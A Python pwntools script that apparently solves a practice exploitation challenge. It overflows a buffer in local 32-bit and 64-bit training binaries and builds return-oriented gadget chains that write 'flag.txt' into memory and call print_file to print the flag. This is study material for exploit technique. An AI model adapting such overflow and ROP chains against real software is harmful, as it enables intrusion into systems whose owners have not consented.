#!/usr/bin/python3

from pwn import *
import sys

def first_binary(): #x32 binary

	binary = './write432'
	elf = context.binary = ELF(binary,checksec=False)
	io = process(binary)

	eip_offset = 44
	pop_edi_ebp = 0x080485aa # pop edi; pop ebp; ret                
	mov_ebp_to_edi = 0x08048543 # mov    DWORD PTR [edi],ebp
	print_file = 0x80483d0 # print_file@plt
	write_read_memory = 0x0804a018 # .data section

	payload = b'a' * eip_offset + p32(pop_edi_ebp) + p32(write_read_memory) + b"flag" 
	payload += p32(mov_ebp_to_edi) # moving flag to 0x0804a018
	payload += p32(pop_edi_ebp) + p32(write_read_memory + 0x4) + b".txt"
	payload += p32(mov_ebp_to_edi) # moving .txt to 0x0804a018 + 0x4
	payload += p32(print_file) + b'xxxx' + p32(write_read_memory) + p32(write_read_memory + 0x4)# Calling printfile with flag.txt argument

	io.sendlineafter('> ', payload)
	print(io.recv())

	io.close()
	return True

def second_binary(): #x64 binary

	binary = './write4'
	elf = context.binary = ELF(binary,checksec=False)
	io = process(binary)

	rsp_offset = 40
	pop_r14_r15 = 0x400690 # pop r14; pop r15; ret;
	mov_r15_to_r14 = 0x400628 # mov    QWORD PTR [r14],r15
	pop_rdi = 0x400693 # pop rdi; ret;
	print_file = 0x400510 # print_file@plt
	write_read_memory = 0x601050 # .data section

	payload = b'a' * rsp_offset + p64(pop_r14_r15) + p64(write_read_memory) + b'flag.txt'
	payload += p64(mov_r15_to_r14)
	payload += p64(pop_rdi) + p64(write_read_memory) + p64(print_file) # Calling printfile with flag.txt argument

	io.sendlineafter('> ', payload)
	print(io.recv())
	print(io.recv())

	io.close()
	return True

if sys.argv[1] == "32":
        first_binary()
elif sys.argv[1] == "64":
        second_binary()
else:
        print("Please enter 32 or 64")